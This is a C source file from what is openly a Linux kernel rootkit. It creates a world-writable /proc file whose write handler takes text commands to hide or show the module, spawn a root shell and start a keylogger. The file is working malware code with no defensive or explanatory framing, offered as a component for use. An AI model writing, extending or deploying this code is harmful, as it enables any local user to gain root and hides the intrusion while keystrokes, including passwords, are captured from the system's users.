/*
 * To communicate kernel modules and user applications, the 
 * file that creates the kernel module is used. This file 
 * is created in the file system /proc when the kernel module 
 * is initialized and is deleted when the module is unloaded.
 *
 * Functions from this file are responsible for reading, 
 * writing and creating this file. The file name is taken 
 * from the variable PROC_FILE_NAME. Next, the action 
 * handlers for the file are registered.
 */
#include "header/proc.h"
#include "header/hide.h"
#include "header/config.h"
#include "header/shell.h"
#include "header/keylogger.h"



/*
 * The function is called when data is write in 
 * /proc/PROC_FILE_NAME.
 */
ssize_t handler_write_proc_file(
        struct file *file, const char __user *buffer, 
        size_t length, loff_t *data) {
        printk("rootkit: write in \"/proc/%s\" file: %ld\n", 
        PROC_FILE_NAME, length);

    if (strncmp(buffer, "hide", 4) == 0) {
        module_hide();
        printk("rootkit: WRITE HIDE\n");
    }
    else if (strncmp(buffer, "show", 4) == 0) {
        module_show();
        printk("rootkit: WRITE SHOW\n");
    }
    else if (strncmp(buffer, "root", 4) == 0) {
        root_shell();
        printk("rootkit: GET ROOT SHELL\n");
    }
    else if (strncmp(buffer, "keyl", 4) == 0) {
        keylogger();
        printk("rootkit: KEYLOGGER START\n");
    }

    return length;
}


/*
 * Registers function-handlers for interacting with a
 * file in /proc/PROC_FILE_NAME.
 */
const struct file_operations proc_file_fops = {
    .owner = THIS_MODULE,
    .write = handler_write_proc_file,
};


/*
 * Creates a file in the file system /proc. Returns 1 if 
 * the file was successfully created and 0 if the file 
 * can not be created.
 */
int create_proc_file(void) {
    /*
    * Note: proc_create_entry seems that since the version 
    * of 3.10.0, the function of proc_create_entry() has 
    * been deleted and replaced by proc_create().
    *
    * #if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
    *     proc_create(...)
    * #else
    *     proc_create_entry(...)
    * #endif
    */

    return (proc_create(
        PROC_FILE_NAME, 0666, NULL, &proc_file_fops) == NULL) ? 0 : 1;
}


/*
 * Deletes a file from the file system /proc.
 */
void remove_proc_file(void) {
    remove_proc_entry(PROC_FILE_NAME, NULL);
}